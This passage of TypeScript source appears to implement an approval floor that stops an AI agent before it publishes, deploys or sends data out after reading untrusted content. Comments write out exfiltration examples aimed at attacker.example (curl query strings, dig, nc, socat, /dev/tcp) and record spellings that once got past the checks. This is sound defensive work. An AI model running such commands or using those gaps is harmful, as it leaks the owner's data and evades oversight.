  ['dist-tag'],
  ['access'],
  ['owner']
];

/*
 * A Map rather than an object literal, and the two tables below with it.
 *
 * `executable` here is whatever the model wrote, and an object literal answers for every name on
 * `Object.prototype`: `REGISTRY_PUBLISH_OPERATIONS['toString']` comes back as a function, which is
 * truthy, and the spread on the next line throws. An exception raised inside the approval floor by
 * one tool call is not a defect worth having in a floor, and a Map costs nothing to avoid it.
 */
const REGISTRY_PUBLISH_OPERATIONS = new Map<string, readonly (readonly string[])[]>(
  Object.entries({
    // `cargo owner` and `gem owner` are deliberately absent, and the reason is a limit of the rule
    // rather than a judgement about the act: both spell the read as a bare subcommand and the write
    // as a flag (`cargo owner --add`, `gem owner -a`), and the flags come off before the match, so
    // the only rule available here cannot tell listing the owners from changing them. Their npm
    // equivalents ARE covered, because npm spells both as words and the read verbs can be named.
    cargo: [['publish'], ['yank']],
    docker: [['push']],
    dotnet: [
      ['nuget', 'push'],
      ['nuget', 'delete']
    ],
    gem: [['push'], ['yank']],
    // Lowercased because the match is: `./gradlew publish` is the task, and `publishToMavenLocal` is
    // deliberately not here - it writes to `~/.m2` on this computer and nobody else can install it.
    gradle: [['publish']],
    gradlew: [['publish']],
    helm: [['push']],
    mvn: [['deploy']],
    npm: NODE_REGISTRY_OPERATIONS,
    pnpm: NODE_REGISTRY_OPERATIONS,
    podman: [['push']],
    poetry: [['publish']],
    twine: [['upload']],
    yarn: [...NODE_REGISTRY_OPERATIONS, ['npm', 'publish'], ['npm', 'tag']]
  })
);

/**
 * The sub-operations that only ask what is already there.
 *
 * `npm owner ls`, `npm dist-tag ls` and `npm access list packages` read a registry and change
 * nothing, and they are how anybody checks the state before deciding. A card in front of a read is
 * the defect this floor's READS table exists to catch, and it is worth the four names to avoid it.
 */
const REGISTRY_READ_OPERATIONS = new Set(['get', 'info', 'list', 'ls']);

/**
 * The word that turns the operation after it into a question about it.
 *
 * `kubectl auth can-i create pods` asks the cluster whether this account MAY create pods, and
 * changes nothing whatever the answer is. The run is matched wherever it sits in the word list -
 * which it has to be, because `kubectl -n prod apply -f x` puts the namespace's value in front of
 * the operation - so `create` was found at word three and the read was shown to the owner as
 * "Change what is deployed with kubectl create", consequential, in all three modes.
 *
 * One name, because one shape was measured: this is the mirror of the trailing test above rather
 * than a list of safe things, and it is checked against the word BEFORE for the same reason that
 * one is checked against the word after.
 */
const ASKING_OPERATIONS = new Set(['can-i']);

/**
 * The one spelling that is an option rather than an operation.
 *
 * `docker buildx build --push .` builds and pushes in a single command and never says `push` as a
 * word, so an operation table alone would have covered the spelling in every tutorial and missed
 * the one in every CI file. Kept to the two container tools deliberately: `--push` on anything else
 * is not known to reach a registry, and a word this common carried across the whole table would
 * card the first tool that adopts it for something local.
 */
const REGISTRY_PUBLISH_OPTIONS = new Map<string, ReadonlySet<string>>([
  ['docker', new Set(['--push'])],
  ['podman', new Set(['--push'])]
]);

/**
 * The publishing operation this command performs, or null.
 *
 * Named rather than boolean because the card has to print it: "npm publish" and "npm owner" are
 * one rule and two different things to be asked about, and a card that says only "publishing" over
 * a JSON dump is the shape `approvalToolPhrases` exists to stop.
 *
 * Flags are dropped before the run is looked for, so `npm --workspace=api publish` and
 * `cargo publish --dry-run` both match. The cost of dropping rather than skipping is that an option
 * with a SEPARATE value contributes that value as a word - `npm run publish`, and `mvn -Dgoal x
 * deploy` - so a script an author named after publishing raises the card. That is the direction to
 * be wrong in here: the card prints the whole command, and a person reading `npm run publish`
 * answers it in a second, while the miss in the other direction is a version on a registry forever.
 */
/**
 * The run of words a command performs out of an operation table, longest first.
 *
 * Longest first, so `yarn npm publish` is named as itself rather than as the `publish` inside it.
 * Both are cards; the card prints the operation, and the more specific one is the true statement.
 *
 * Shared with the hosting table below so the two cannot drift on the one thing that decides them:
 * where a subcommand may sit, and which trailing word makes it a read instead.
 */
const operationNamed = (
  operations: readonly (readonly string[])[],
  words: readonly string[]
): readonly string[] | undefined =>
  [...operations]
    .sort((left, right) => right.length - left.length)
    .find((operation) =>
      words.some(
        (_, start) =>
          operation.every((word, index) => words[start + index] === word) &&
          !REGISTRY_READ_OPERATIONS.has(words[start + operation.length] ?? '') &&
          !ASKING_OPERATIONS.has(words[start - 1] ?? '')
      )
    );

export const registryPublishOperation = (
  executable: string,
  commandArgs: readonly string[]
): string | null => {
  const operations = REGISTRY_PUBLISH_OPERATIONS.get(executable);
  if (!operations) return null;
  const lowered = commandArgs.map((argument) => unquoted(argument).toLowerCase());
  const option = lowered.find((argument) =>
    REGISTRY_PUBLISH_OPTIONS.get(executable)?.has(argument)
  );
  if (option) return `${executable} ${option}`;
  const matched = operationNamed(
    operations,
    lowered.filter((argument) => !argument.startsWith('-'))
  );
  return matched ? `${executable} ${matched.join(' ')}` : null;
};

/**
 * Putting something where other people can reach it, by a route that is not a package registry.
 *
 * The owner named "publishing anything online" as a thing that must always stop, and until this
 * table the floor's whole answer to it was `git push`, `publish_site` and the registry rule above.
 * Measured on this tree before the change, in balanced AND autonomous: `vercel --prod`,
 * `vercel deploy --prod`, `flyctl deploy`, `netlify deploy --prod`, `wrangler publish`,
 * `wrangler deploy`, `kubectl apply -f k8s.yaml`, `gcloud app deploy`, `terraform apply` and
 * `firebase deploy` raised NOTHING. Two of the brief's seven already stopped and are left where
 * they are rather than duplicated: `gh release create` raised "Send data using gh" and
 * `aws s3 sync ./dist s3://bucket` raised "Allow internet access", both `external_reversible`; the
 * gh entry below promotes the first to the consequential card that says what it is, and the second
 * keeps the card it has.
 *
 * An operation check rather than a bare executable name, for the reason the registry table gives:
 * `vercel dev` is not `vercel --prod`, `netlify dev` is not `netlify deploy`, `kubectl get` is not
 * `kubectl apply`, and carding both is the friction the owner has explicitly rejected. Every read
 * verb any of these tools spells - `ls`, `logs`, `status`, `plan`, `describe`, `get`, `top`,
 * `rollout status`, `env pull`, `whoami`, `tail`, `dev`, `build` - is absent by construction,
 * because this names what changes rather than what is safe.
 *
 * Two kinds, because one card cannot honestly name both. `vercel deploy` puts bytes where the
 * public can read them; `kubectl apply` replaces what a cluster is running. Both are irreversible
 * from this computer and both must stop, and each says which it is.
 */
type DeploymentKind = 'publishes' | 'reconfigures';
const DEPLOYMENT_OPERATIONS = new Map<
  string,
  { readonly kind: DeploymentKind; readonly operations: readonly (readonly string[])[] }
>();
const deployments = (
  kind: DeploymentKind,
  table: Record<string, readonly (readonly string[])[]>
): void => {
  for (const [executable, operations] of Object.entries(table))
    DEPLOYMENT_OPERATIONS.set(executable, { kind, operations });
};

const FLY_OPERATIONS = [['deploy'], ['launch'], ['apps', 'create'], ['apps', 'destroy']];
const NETLIFY_OPERATIONS = [['deploy']];
const SERVERLESS_OPERATIONS = [['deploy'], ['remove']];
const VERCEL_OPERATIONS = [['deploy'], ['promote'], ['redeploy'], ['rollback'], ['alias', 'set']];
deployments('publishes', {
  // `aws s3 sync` and `aws s3 cp` are NOT here. They already stop, in every mode, through the
  // egress arm - and an object copy to a bucket nobody can read is not publishing, so a card
  // claiming it was would be false on the common case. What is unambiguous is turning a bucket into
  // a website, and handing an object an acl anyone can read, which `publicObjectAcl` below covers.
  aws: [['s3', 'website']],
  eb: [['deploy']],
  firebase: [['deploy']],
  fly: FLY_OPERATIONS,
  flyctl: FLY_OPERATIONS,
  gcloud: [
    ['app', 'deploy'],
    ['run', 'deploy'],
    ['functions', 'deploy'],
    ['builds', 'submit']
  ],
  // `gh release list` and `gh release view` are reads and stay free; `gh gist create` is the same
  // act as a release by a shorter route.
  gh: [
    ['release', 'create'],
    ['release', 'upload'],
    ['release', 'edit'],
    ['release', 'delete'],
    ['gist', 'create']
  ],
  netlify: NETLIFY_OPERATIONS,
  ntl: NETLIFY_OPERATIONS,
  serverless: SERVERLESS_OPERATIONS,
  sls: SERVERLESS_OPERATIONS,
  sst: [['deploy']],
  vercel: VERCEL_OPERATIONS,
  wrangler: [
    ['deploy'],
    ['publish'],
    ['pages', 'deploy'],
    ['pages', 'publish'],
    ['versions', 'upload'],
    ['triggers', 'deploy']
  ]
});
deployments('reconfigures', {
  // `helm push` is in the registry table; these four change what a cluster runs rather than what a
  // chart repository holds.
  helm: [['install'], ['upgrade'], ['uninstall'], ['rollback']],
  kubectl: [
    ['apply'],
    ['create'],
    ['delete'],
    ['replace'],
    ['patch'],
    ['edit'],
    ['scale'],
    ['annotate'],
    ['label'],
    ['drain'],
    ['taint'],
    ['cordon'],
    ['uncordon'],
    ['set'],
    ['rollout', 'restart'],
    ['rollout', 'undo']
  ],
  pulumi: [['up'], ['destroy']],
  terraform: [['apply'], ['destroy'], ['import'], ['taint'], ['state', 'push']],
  tofu: [['apply'], ['destroy'], ['import'], ['taint'], ['state', 'push']]
});

/**
 * The one spelling that is an option rather than an operation, and the one that is neither.
 *
 * `vercel --prod` is the whole deployment written as a flag, and it is what every Vercel tutorial
 * says; so is a bare `vercel`, which deploys the working directory. Both are held here rather than
 * in the operation table because neither says a word this file could match. `--help` and
 * `--version` are the counterweight: they are the only arguments under which a bare invocation
 * deploys nothing.
 */
const DEPLOYMENT_OPTIONS = new Map<string, ReadonlySet<string>>([
  ['vercel', new Set(['--prod', '--production'])]
]);
const DEPLOYS_WHEN_BARE = new Set(['vercel']);
const INFORMATIONAL_OPTIONS = new Set(['-h', '--help', '-v', '--version', '--json']);

/**
 * The two shapes under which a named deployment operation deploys nothing.
 *
 * `--help` printed the manual and was shown to the owner as the act itself: `terraform apply
 * --help` and `kubectl set image --help` both raised "Change what is deployed", consequential, in
 * all three modes. `INFORMATIONAL_OPTIONS` already existed and already said this - it was only
 * ever consulted on a BARE invocation, so the arm that matches an operation never saw it. Narrower
 * than that set here, deliberately: `-v` is kubectl's verbosity and `--json` is how `pulumi up`
 * is read by a script, and both of those really do deploy.
 *
 * A CLIENT-SIDE DRY RUN is the other, and it is the one that costs a working day.
 * `kubectl create deployment app --image=nginx --dry-run=client -o yaml` is how every manifest in
 * every tutorial is generated, `kubectl apply --dry-run=client` is what anybody does before
 * applying, and `helm upgrade --dry-run` renders the chart and contacts nothing. All four carded
 * as the deployment itself. `--dry-run=none` is kubectl's spelling of "actually do it" and is
 * deliberately not matched.
 *
 * Held here and NOT in the registry table above, which refuses the same exemption and says why:
 * `npm publish --dry-run` is one word from the real thing, and an exemption keyed on a flag is one
 * an injected instruction writes for itself. The difference is that these tools spell the flag as a
 * mode the tool itself enforces before anything leaves, and this table is the only reader of it.
 *
 * PER EXECUTABLE, and that is the whole care in it. `--help` is honoured by every program ever
 * written, so one set holds it; `--dry-run` is honoured by the four tools below that define it,
 * and a tool that IGNORED an option it did not recognise would otherwise be handed an exemption
 * written in nine characters. So the option is only read on a tool this file knows spells it.
 *
 * `kubectl label pods p --list` is NOT covered and stays a false card, recorded rather than
 * repaired: `--list` is an option two kubectl verbs define and nothing else in this table does,
 * and buying one uncommon read with an exemption the rest of the table would not recognise is the
 * trade this paragraph exists to refuse.
 */
const DRY_RUN_OPTIONS = new Map<string, RegExp>([
  ['kubectl', /^--dry-run(?:=(?:client|server))?$/],
  ['helm', /^--dry-run(?:=\S+)?$/],
  ['wrangler', /^--dry-run$/],
  ['firebase', /^--dry-run$/]
]);
const HELP_OPTIONS = new Set(['-h', '--help']);

/**
 * An object handed an access-control list anyone can read, whichever store CLI wrote it.
 *
 * The brief's `aws s3 sync` to a PUBLIC bucket, which no command names as such - the bucket's
 * policy is on the far side. What a command does name is the acl it sets, and `public-read` on a
 * copy or on a bucket is the act itself rather than a guess about one.
 */
const PUBLIC_OBJECT_ACLS = new Set(['public-read', 'public-read-write']);
const publicObjectAcl = (executable: string, words: readonly string[]): boolean =>
  OBJECT_STORE_EXECUTABLES.has(executable) && words.some((word) => PUBLIC_OBJECT_ACLS.has(word));

/** What this command deploys, and which of the two things it does to it, or null. */
export const deploymentOperation = (
  executable: string,
  commandArgs: readonly string[],
  /**
   * Whether this name is the command itself rather than a word found inside one.
   *
   * The bare arm below is the weakest evidence in this file - a name and no operation at all - and
   * the walk that reads past unnamed words hands it every word of every command. `hash vercel`,
   * which asks the shell to remember where vercel is, came back as "Publish online with vercel" in
   * all three modes on that route. A bare name is only a deployment when nothing else was asked.
   */
  atHead = true
): { readonly kind: DeploymentKind; readonly operation: string } | null => {
  const lowered = commandArgs.map((argument) => unquoted(argument).toLowerCase());
  const dryRun = DRY_RUN_OPTIONS.get(executable);
  if (lowered.some((argument) => HELP_OPTIONS.has(argument) || dryRun?.test(argument))) return null;
  const words = lowered.filter((argument) => !argument.startsWith('-'));
  if (publicObjectAcl(executable, words))
    return { kind: 'publishes', operation: `${executable} --acl public-read` };
  const entry = DEPLOYMENT_OPERATIONS.get(executable);
  if (!entry) return null;
  // The operation before the option, which is the opposite order to the registry table and for the
  // opposite reason: `docker --push` is the only way that act is spelt, while `vercel deploy --prod`
  // says both, and the word is the truer half of the name a card prints.
  const matched = operationNamed(entry.operations, words);
  if (matched) return { kind: entry.kind, operation: `${executable} ${matched.join(' ')}` };
  const option = lowered.find((argument) => DEPLOYMENT_OPTIONS.get(executable)?.has(argument));
  if (option) return { kind: entry.kind, operation: `${executable} ${option}` };
  return atHead &&
    DEPLOYS_WHEN_BARE.has(executable) &&
    words.length === 0 &&
    !lowered.some((argument) => INFORMATIONAL_OPTIONS.has(argument))
    ? { kind: entry.kind, operation: executable }
    : null;
};

export const packageRemovalExecutables = new Set([
  // Every system package manager, not only the one this box happens to run: the approval a package
  // install raises has to be the same question on a Fedora, Rocky or Arch host as on a Debian one.
  'apk',
  'apt',
  'apt-get',
  'aptitude',
  'brew',
  'cargo',
  'dnf',
  'dnf5',
  'emerge',
  'microdnf',
  'npm',
  'pacman',
  'pip',
  'pip3',
  'pnpm',
  'yarn',
  'yay',
  'yum',
  'zypper'
]);
export const packageRemovalCommands = new Set(['remove', 'uninstall', 'purge', 'autoremove']);
export const packageInstallCommands = new Set([
  'add',
  'install',
  'update',
  'upgrade',
  'dist-upgrade',
  'full-upgrade'
]);
const gitOptionsWithSeparateValue = new Set([
  '-c',
  '-C',
  '--config-env',
  '--exec-path',
  '--git-dir',
  '--namespace',
  '--super-prefix',
  '--work-tree'
]);

/**
 * Where git's own options end and its subcommand begins, or -1 when there is no subcommand.
 * `git -C sub push` and `git --git-dir=... push` reach the same remote as a bare `git push`, so the
 * approval floor is keyed on the real subcommand rather than on the first argument.
 */
const gitSubcommandIndex = (args: readonly string[]): number => {
  for (let index = 0; index < args.length; index += 1) {
    const argument = args[index] ?? '';
    if (!argument.startsWith('-')) return index;
    if (argument.includes('=')) continue;
    if (gitOptionsWithSeparateValue.has(argument)) index += 1;
  }
  return -1;
};

export const gitSubcommand = (args: string[]): string | null => {
  const index = gitSubcommandIndex(args);
  return index < 0 ? null : (args[index] ?? '').toLowerCase();
};

/**
 * Whether a git command deletes a whole second checkout.
 *
 * `git worktree remove --force ../wt` deletes the directory and everything uncommitted in it, and
 * it was free in balanced and autonomous: `WRITING_GIT_SUBCOMMANDS` scored `worktree` a change for
 * the completion clock and nothing in the destructive vocabulary read it, so the tree documented a
 * destruction it did not card. Measured through the shipped `approvalRequirement` in autonomous
 * with an undo point before this existed: `git worktree remove --force ~/wt` raised no card, and
 * neither did `bash -lc 'rm -rf dist && git worktree remove --force ../wt'` - the script walk
 * placed `dist` and read the git command as removing nothing at all.
 *
 * Narrowed to the verb, the way `clean -f`, `reset --hard` and `restore` are narrowed beside it.
 * `git worktree list` prints, `git worktree add` creates, and `git worktree lock`/`unlock` set a
 * flag; none of them removes anything and none of them may cost a card. `prune` is deliberately
 * out too: it clears the administrative record of worktrees whose directories are ALREADY gone, so
 * there is nothing left for it to delete.
 *
 * The verb is the first non-option token after the subcommand, because `git worktree --help remove`
 * is help and `git worktree remove --force x` is the act.
 */
const worktreeVerb = (args: readonly string[]): { verb: string; operands: string[] } | null => {
  const at = gitSubcommandIndex(args);
  if (at < 0 || (args[at] ?? '').toLowerCase() !== 'worktree') return null;
  const rest = args.slice(at + 1);
  const verbAt = rest.findIndex((argument) => !argument.startsWith('-'));
  if (verbAt < 0) return null;
  return {
    verb: (rest[verbAt] ?? '').toLowerCase(),
    operands: rest.slice(verbAt + 1).filter((argument) => !argument.startsWith('-'))
  };
};

export const gitRemovesAWorktree = (args: readonly string[]): boolean =>
  worktreeVerb(args)?.verb === 'remove';

/**
 * The directory `git worktree remove` deletes, or null when it cannot be shown.
 *
 * Answered so a worktree the agent made for itself inside `workspace/` costs nothing: that one is
 * strictly inside `CHECKPOINT_CONTENT` and a rewind puts it back, which is the same test every
 * other removal in this file gets. `~/wt` and `../wt` resolve outside it and keep the card.
 *
 * Null for a `remove` with no operand - which is not a command git runs either - because null is
 * how everything else here says "cannot place this", and the caller reads it as a card.
 */
const worktreeRemovalTargets = (args: readonly string[]): string[] | null => {
  const parsed = worktreeVerb(args);
  if (parsed?.verb !== 'remove') return null;
  return parsed.operands.length ? parsed.operands : null;
};

/** The options that only say which file `git config` is talking about. */
const GIT_CONFIG_SCOPES = new Set(['--global', '--local', '--system', '--worktree']);

/** The options whose whole job is to print a setting back. */
const GIT_CONFIG_READS = new Set([
  '--list',
  '-l',
  '--get',
  '--get-all',
  '--get-regexp',
  '--get-urlmatch'
]);

/**
 * Settings that cannot carry execution, however they are spelled.
 *
 * Kept as an exemption rather than inverted into a list of dangerous keys, because the dangerous
 * list is open-ended - `core.hooksPath`, `alias.*`, `include.path`, `core.pager`, `credential.helper`,
 * `filter.*.clean`, `core.fsmonitor`, `init.templateDir` and whatever git adds next all end in a
 * command git runs on its own - and a rule that enumerated them would pass every key invented after
 * it was written. These fourteen are the ones a first hour on a fresh box actually sets; each one
 * takes a name, a flag or an enum, none of them takes a command, and everything else still asks.
 */
const GIT_CONFIG_INERT_KEYS = new Set([
  'advice.detachedhead',
  'color.ui',
  'core.autocrlf',
  'core.filemode',
  'core.ignorecase',
  'diff.algorithm',
  'fetch.prune',
  'init.defaultbranch',
  'merge.conflictstyle',
  'pull.rebase',
  'push.autosetupremote',
  'push.default',
  'rerere.enabled',
  'user.email',
  'user.name'
]);

/**
 * What a `git config` invocation writes: the setting's own key, or '' when the invocation is one
 * this cannot read confidently. Null when it only reads.
 *
 * `git config` writes `.gitconfig` without ever naming a path, so the deferred-execution rule that
 * reads the paths a call writes cannot see it at all - it needs its own answer, and two callers
 * need the same one. The floor asks whether to stop for the owner; `isMutatingToolCall` asks
 * whether the computer changed, which is why it was wrong for a call the floor already calls
 * consequential to be no change at all. One predicate, so the two cannot drift apart.
 *
 * The '' case is the fail-closed one and it is load-bearing: `--file` and `-f` redirect the write to
 * a file of the caller's choosing, `--unset` and `--add` change what the operands mean, and any of
 * them makes the key unnameable here. An invocation carrying anything but a scope reports a key
 * nothing can exempt, which is the same answer as an unrecognised key.
 */
export const gitConfigWrite = (args: readonly string[]): string | null => {
  const index = gitSubcommandIndex(args);
  if (index < 0 || (args[index] ?? '').toLowerCase() !== 'config') return null;
  const rest = args.slice(index + 1);
  if (rest.some((argument) => GIT_CONFIG_READS.has(argument.toLowerCase()))) return null;
  const options = rest.filter((argument) => argument.startsWith('-'));
  const operands = rest.filter((argument) => !argument.startsWith('-'));
  if (!options.every((option) => GIT_CONFIG_SCOPES.has(option.toLowerCase()))) return '';
  // `git config user.email` with nothing after it prints the setting; it is the spelling for a read
  // that does not use `--get`, and carding it was the same defect as carding `cat`.
  return operands.length < 2 ? null : (operands[0] ?? '').toLowerCase();
};

/** Whether a `git config` write can leave behind something a later git invocation executes. */
export const gitConfigRunsCode = (args: readonly string[]): boolean => {
  const key = gitConfigWrite(args);
  return key !== null && !GIT_CONFIG_INERT_KEYS.has(key);
};

/**
 * Every http(s) address named anywhere in a shell call, including inside an inline script.
 *
 * `shell` has no network flag it must set to reach the internet - the installer ships the
 * per-command namespace off, because a command with its own loopback breaks published previews - so
 * `network: true` is a declaration rather than a gate. An exfiltration does not have to declare
 * itself: `curl https://attacker.example/?q=<the mailbox>` is a read-shaped GET, it trips none of
 * the write-flag checks below, and it is the same clean channel `parallel_web_read` is already
 * judged on. So while the turn is tainted the addresses are pulled out of the command itself and
 * run through the same destination policy.
 */
const URL_IN_COMMAND = /https?:\/\/[^\s'"`<>\\)]+/g;

/** Everything a `shell` call wrote down, wherever it wrote it: the invocation and any script. */
const commandText = (args: Record<string, unknown>): string =>
  [
    textValue(args.executable),
    ...(Array.isArray(args.args) ? args.args.map(String) : []),
    commandScript(args)
  ].join(' ');

const literalUrlsInCommand = (args: Record<string, unknown>): string[] => [
  ...new Set(commandText(args).match(URL_IN_COMMAND) ?? [])
];

/**
 * The programs whose argument is a name for the network to resolve, not a file to open.
 *
 * A name lookup is the cheapest exfiltration channel on any computer: the payload IS the name, it
 * leaves through the resolver before anything answers, and it needs no reply and no listening
 * service to succeed. `dig <the mailbox, base32>.attacker.example` was measured on this tree as
 * zero destinations, zero bytes charged and no card, on a turn the floor had already marked
 * tainted.
 *
 * The reachability tools are here for the same reason and not as an afterthought: `ping` resolves
 * the name exactly as `dig` does, so closing one and leaving the other is not a bound, it is a
 * change of spelling. The cost is stated in docs/design/ranked/CARD-AND-SHELL.md - on a tainted
 * turn `ping -c1 8.8.8.8` now raises a card - and it is a card, not a refusal.
 */
const RESOLVING_EXECUTABLES = new Set([
  'delv',
  'dig',
  'dog',
  'drill',
  'getent',
  'host',
  'kdig',
  'mtr',
  'nslookup',
  'ping',
  'ping6',
  'resolvectl',
  'systemd-resolve',
  'tracepath',
  'traceroute',
  'traceroute6'
]);

/**
 * Clients where every argument that names a host is an address the call would fetch - and which
 * therefore ALWAYS write their address down, so one that does not is one this cannot read.
 *
 * The second half is the honest half of the shell bound, and it is the same set rather than a second
 * one beside it because two lists of the same seven names drift. `curl -s "$U"`,
 * `wget "$(cat url.txt)"` and every other address composed at run time are unreadable here and
 * always will be - no static reader resolves a variable - and until now they were the quietest hole
 * in the file: the fetch tainted the turn, then no destination was found, so no card was raised and
 * no bytes were charged, and the turn went on being judged as though nothing had left. An unreadable
 * destination is the strongest case for asking the owner, not the weakest, so these raise the card
 * the address would have raised.
 *
 * `git`, `gh` and the package managers are deliberately absent. Their remote lives in the
 * repository's or the installation's own configuration rather than in the command, so requiring an
 * address of them would card `git pull`, `gh api /repos/x/y` and `pip install requests` on every
 * tainted turn - the ordinary work of this product - to catch a shape none of them is used in.
 * `git clone "$U"` is the gap that leaves, and it is stated rather than papered over.
 */
const FETCH_CLIENT_EXECUTABLES = new Set([
  'aria2c',
  'curl',
  'http',
  'httpie',
  'wget',
  'youtube-dl',
  'yt-dlp'
]);

/**
 * Clients that open one connection, to the first host their arguments name.
 *
 * Only the first, because everything after it is the remote command or the payload: the tokens in
 * `ssh host.example cat notes.txt` after `host.example` run on the far end, and reading them as
 * addresses would put `notes.txt` on the card as somewhere data was going.
 */
const CONNECTING_EXECUTABLES = new Set(['ftp', 'nc', 'ncat', 'netcat', 'socat', 'ssh', 'telnet']);

/**
 * Copiers where a remote end is written as a remote end.
 *
 * `scp`, `sftp` and `rsync` tell local from remote by the `:` or the `@`, which is a fact about
 * their argument grammar rather than a guess about it - so `scp notes.txt user@x.example:/tmp/`
 * names one destination and not two.
 */
const REMOTE_SPEC_EXECUTABLES = new Set(['rsync', 'scp', 'sftp']);

/**
 * Options whose value is something on this computer, so the token after them names no address.
 *
 * Case matters and the existing spelling test says why: curl's `-D` writes the response headers to
 * a local file and `-d` sends a body, `-T` uploads and `-t` sets a telnet option. Long forms are
 * matched lowercased, short forms exactly, which is how `sendsDataOverNetwork` above already reads
 * the same argument lists.
 *
 * This list is the PRECISION and not the safety, in the direction that matters: a spelling missing
 * from it means a local filename is offered to the address reader, which at worst costs one card on
 * a turn that has already read untrusted content. A spelling wrongly ON it would hide an address,
 * so nothing is here whose value can be one - `-x/--proxy`, `--url`, `--resolve` and `--connect-to`
 * all name somewhere on the network and are all deliberately absent.
 */
const LOCAL_VALUE_OPTIONS: Record<string, ReadonlySet<string>> = {
  curl: new Set([
    '-o',
    '-D',
    '-c',
    '-K',
    '-E',
    '-T',
    '-w',
    '-X',
    '-m',
    '-C',
    '-Y',
    '-y',
    '-z',
    '--output',
    '--dump-header',
    '--cookie-jar',
    '--config',
    '--cert',
    '--key',
    '--cacert',
    '--capath',
    '--upload-file',
    '--write-out',
    '--request',
    '--netrc-file',
    '--trace',
    '--trace-ascii',
    '--stderr',
    '--max-time'
  ]),
  wget: new Set([
    '-O',
    '-o',
    '-a',
    '-P',
    '-i',
    '-t',
    '-T',
    '-w',
    '-Q',
    '--output-document',
    '--output-file',
    '--append-output',
    '--directory-prefix',
    '--input-file',
    '--load-cookies',
    '--save-cookies',
    '--ca-certificate',
    '--ca-directory',
    '--certificate',
    '--private-key',
    '--post-file',
    '--body-file',
    '--config'
  ]),
  ssh: new Set(['-i', '-F', '-E', '-S', '-o']),
  scp: new Set(['-i', '-F', '-E', '-S', '-o']),
  sftp: new Set(['-i', '-F', '-E', '-S', '-o', '-b']),
  rsync: new Set(['-e', '--rsh', '--exclude-from', '--files-from', '--log-file', '--password-file'])
};

/**
 * Options whose value is material the request carries without any of it appearing in the address.
 *
 * This is the second half of the shell hole and the one that needed a decision rather than a list.
 * `curl -H "X-Data: <the mailbox>" https://docs.example.com/` goes to a host the turn legitimately
 * read, so the address costs two bytes and raises nothing, while the payload rides out in a header
 * that nothing here was measuring. HTTP does not care which part of a request the bytes are in and
 * neither does the recipient, so neither does the budget: these values are attached to the address
 * before it is judged, and `classifyDestination` charges them exactly as it charges a path segment.
 *
 * Ordinary work stays ordinary because the charge is against the owner's own corpus rather than
 * against a threshold on the flag. Measured: `curl -H 'Accept: application/json'` on an address a
 * search handed the model costs 30 of the 1,024 bytes a tainted turn may spend and raises nothing -
 * thirty-four such requests before anybody is asked - while a 96-byte payload in the same header
 * costs 107 and raises the card on the first one. Carding on the presence of `-H` would have
 * stopped both, and a bound that interrupts real work is one the owner turns off.
 */
const CARRIED_VALUE_OPTIONS: Record<string, ReadonlySet<string>> = {
  curl: new Set([
    '-H',
    '-d',
    '-F',
    '-b',
    '-A',
    '-e',
    '-u',
    '--header',
    '--data',
    '--data-ascii',
    '--data-binary',
    '--data-raw',
    '--data-urlencode',
    '--form',
    '--form-string',
    '--cookie',
    '--user-agent',
    '--referer',
    '--user',
    '--url-query'
  ]),
  wget: new Set([
    '--header',
    '--post-data',
    '--body-data',
    '--user',
    '--password',
    '--user-agent',
    '--referer'
  ])
};

const IPV4_LITERAL = /^\d{1,3}(?:\.\d{1,3}){3}$/;

/**
 * An address written as one number rather than as four.
 *
 * `getaddrinfo` accepts an IPv4 address as a single integer and as hexadecimal, so `nc 134744072
 * 443` and `nc 0x08080808 443` both reach 8.8.8.8. Dotted-quad was the only spelling read here -
 * `010.010.010.010` already matched it, having four parts - so these two were a destination this
 * could not see.
 *
 * The floor is what makes it usable rather than a nuisance. A bare integer is far more often a port
 * or a count than an address, and reading every one of them carded `nc -l 8080` as 0.0.31.144 and
 * `curl --retry 5` as 0.0.0.5 - ordinary work, on a card, which is how a floor gets switched off.
 * Anything below 0x1000000 is an address in 0.0.0.0/8, which is "this network" and cannot be a
 * destination, so refusing it loses no channel and takes every count and every port with it.
 */
const numericHost = (host: string): boolean => {
  if (!/^(?:0[xX][0-9A-Fa-f]{1,8}|\d{1,10})$/.test(host)) return false;
  const value = /^0[xX]/.test(host) ? Number.parseInt(host.slice(2), 16) : Number(host);
  return value >= 0x100_0000 && value <= 0xffff_ffff;
};

/**
 * An IPv6 literal, which is the one address whose own spelling is made of the character an
 * authority is split on - so it has to be recognised before that split rather than after it.
 *
 * Bracketed is how a URL writes it and how `socat` takes it; bare is how it arrives as a shell
 * argument, where the port is a separate token: `nc 2001:db8::1 443`. Requiring two colons keeps
 * `docs.example.com:443` out, and allowing nothing but hex, colons and the dots of an IPv4-mapped
 * tail keeps `TCP:attacker.example:443` out - that one is a host called `TCP` and has its own
 * reader. A literal has no root label to strip and is returned as it is written.
 */
const ipv6Authority = (authority: string): [string, string] | null => {
  const bracketed = /^\[([0-9A-Fa-f:.]+)\](?::(\d+))?$/.exec(authority);
  if (bracketed) return [`[${bracketed[1] ?? ''}]`, bracketed[2] ?? ''];
  if (!/^[0-9A-Fa-f:]*:[0-9A-Fa-f:]*:[0-9A-Fa-f:.]*$/.test(authority)) return null;
  return [`[${authority}]`, ''];
};
/**
 * A dotted name with a top-level label that could be one: two or more characters, letter first.
 *
 * Anchored, and that is what does the work. Every non-address a fetch client is handed - a header
 * value, a form field, an httpie `name=John Smith`, a `%{http_code}` format string - fails on the
 * anchors, so no separate refusal for the shapes a shell composes at run time is needed and none is
 * kept: one was, and it cost precision rather than buying safety. `curl 'attacker.example/?q=a b'`
 * came back as an address this could not read, charged four bytes for the word `curl`, while the
 * host and the payload were both written out in front of it.
 *
 * `localhost` is named because it is the one host in daily use here with no dot in it, and the
 * alternative was a card in front of `curl localhost:3000/health` on every tainted turn. It is not
 * a way out of anything: `classifyDestination` sends loopback and the private ranges to
 * `isPublicHttpUrl`, which is where somewhere-data-cannot-go is decided for every tool at once.
 *
 * The trailing dot is taken off before the test rather than allowed by it, and that is the whole of
 * the repair below. A name may end in the DNS root label - `attacker.example.` - and `getaddrinfo`
 * accepts it: measured on this box, `localhost.` resolves to 127.0.0.1. Against the anchor above it
 * is not a name at all, so ONE character bought every reader in this file at once. Measured before
 * this line on a tainted turn, all at 0 destinations, 0 bytes and no card: `dig
 * <the mailbox>.attacker.example.`, `host`, `nslookup` and `ping` in the same shape, `nc
 * attacker.example. 443`, `socat - TCP:attacker.example.:443`, `ssh me@attacker.example.`, `scp
 * notes.txt me@attacker.example.:/tmp/`, `rsync`, `telnet`, and
 * `exec 3<>/dev/tcp/attacker.example./443`. The dotless spelling of every one of them cards at 10.
